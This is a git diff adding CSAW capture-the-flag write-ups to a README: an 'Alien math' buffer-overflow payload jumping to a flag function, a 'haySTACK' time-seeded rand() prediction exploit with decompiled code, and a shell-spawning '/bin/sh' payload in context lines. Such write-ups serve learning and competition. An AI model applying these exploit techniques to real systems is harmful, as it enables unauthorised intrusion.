@@ -1,10 +1,116 @@
 Table of Contents
 =================
 
+   * [Alien math](#alien-math)
+   * [haySTACK](#haystack)
    * [procrastination-simulator](#procrastination-simulator)
       * [file_4](#file_4)
       * [file_2](#file_2)
       * [file_1](#file_1)
+   * [Cold](#cold)
+   * [word_games](#word_games)
+
+## Alien math
+```
+Alien Math
+60
+Brush off your Flirbgarple textbooks!
+
+nc pwn.chal.csaw.io 5004
+```
+![image](https://user-images.githubusercontent.com/87422359/133059630-36a26841-4747-4ec2-8b66-33a8b6ca0365.png)
+![image](https://user-images.githubusercontent.com/87422359/133059840-163d6577-05db-47ce-af83-eb8601f5fc55.png)
+![image](https://user-images.githubusercontent.com/87422359/133060090-14b3f5c4-76ad-46f0-9c3c-9235d4531789.png)
+there are a BoF bug and a function give us the flag, just return to it.
+<br />
+payload:
+<br />
+```python
+print_flag = 0x4014FB
+r.sendlineafter("salwzoblrs", 'a'*0x18 + p64(print_flag))
+```
+## haySTACK
+![image](https://user-images.githubusercontent.com/87422359/133061463-df45127b-c6df-4a61-9bc8-19277783455a.png)
+```c
+unsigned __int64 __fastcall sub_1273(__int64 a1)
+{
+  int i; // [rsp+14h] [rbp-3Ch]
+  int v3; // [rsp+18h] [rbp-38h]
+  int v4; // [rsp+1Ch] [rbp-34h]
+  char s[8]; // [rsp+20h] [rbp-30h] BYREF
+  __int64 v6; // [rsp+28h] [rbp-28h]
+  __int64 v7; // [rsp+30h] [rbp-20h]
+  __int64 v8; // [rsp+38h] [rbp-18h]
+  unsigned __int64 v9; // [rsp+48h] [rbp-8h]
+
+  v9 = __readfsqword(0x28u);
+  v3 = random();
+  *(4LL * v3 + a1) = 4919;
+  *s = 0LL;
+  v6 = 0LL;
+  v7 = 0LL;
+  v8 = 0LL;
+  for ( i = 0; i <= 2; ++i )
+  {
+    fwrite("Which haystack do you want to check?\n", 1uLL, 0x25uLL, stdout);
+    fgets(s, 32, stdin);
+    v4 = atoi(s);
+    if ( v4 <= 0x100000 )
+    {
+      if ( v4 == v3 )
+      {
+        printf("Hey you found a needle! And its number is 0x%08x! That's it!\n", *(4LL * v4 + a1));
+        win();
+      }
+      else
+      {
+        printf("Hey, you found a needle, but it's number is 0x%08x. I don't like that one\n", *(4LL * v4 + a1));
+        if ( i )
+        {
+          if ( i == 1 )
+            puts("Did I mention I'm in a hurry? I need you to find it on your next guess");
+        }
+        else
+        {
+          puts("Shoot, I forgot to tell you that I hid a needle in every stack. But I only have one favorite needle");
+        }
+      }
+    }
+    else
+    {
+      fwrite("I don't have that many haystacks!\n", 1uLL, 0x22uLL, stdout);
+    }
+    if ( i == 2 )
+    {
+      puts("I'm out of time. Thanks for trying...");
+      return v9 - __readfsqword(0x28u);
+    }
+    puts("Let's try again!");
+  }
+  return v9 - __readfsqword(0x28u);
+}
+```
+we will got flag if out input equal to the random number `v3`
+<br />
+payload:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int main(int argc,char** argv) {
+	int result;
+	srand(time(NULL) + 2);
+	result = rand() % 0x100000;
+	printf("%d\n", result);
+}
+```
+```python
+seed = int(time())
+process = subprocess.Popen('./a.out', stdout=subprocess.PIPE)
+rd = process.stdout.readline().rstrip()
+r.sendline(rd)
+```
 ## procrastination-simulator
 ```
 procrastination-simulator
@@ -98,3 +204,5 @@ payload  = '/bin/sh'
 sleep(1)
 p.sendline(payload)
 ```
+## Cold
+## word_games
